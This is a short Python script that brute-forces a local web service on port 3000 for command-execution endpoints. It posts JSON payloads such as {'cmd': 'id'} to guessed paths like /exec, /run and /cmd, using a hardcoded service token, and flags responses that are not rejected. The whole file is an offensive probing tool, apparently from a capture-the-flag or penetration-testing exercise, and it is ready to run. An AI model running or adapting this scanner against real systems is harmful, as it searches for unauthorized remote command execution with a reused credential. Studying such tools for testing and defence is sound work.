import urllib.request
import urllib.error
import json

# CONFIG
base_url = "http://127.0.0.1:3000"
token = "313b96f83a85fb32b31ec70d86d5e40c"
headers = {"X-Service-Token": token, "Content-Type": "application/json"}

paths = ["/", "/run", "/exec", "/job", "/task", "/worker", "/api/run", "/cmd"]
keys = ["cmd", "command", "args", "script", "action"]

print("[-] Starting scan...")

for path in paths:
    for key in keys:
        url = base_url + path
        # Python 3 requires data to be bytes, not string
        data = json.dumps({key: "id"}).encode('utf-8')
        
        req = urllib.request.Request(url, data=data, headers=headers)
        try:
            # urlopen is now inside urllib.request
            response = urllib.request.urlopen(req)
            print(f"[!] SUCCESS! Path: {path} | Key: {key} | Code: {response.getcode()}")
            # Response read returns bytes, decode to print string
            print(response.read().decode('utf-8'))
            
        except urllib.error.HTTPError as e:
            if e.code != 400 and e.code != 404:
                 print(f"[+] INTERESTING: {path} | {key} | Code: {e.code}")
                 
        except Exception as e:
            # Useful to see if connection is refused entirely
            # print(f"[-] Error: {e}")
            pass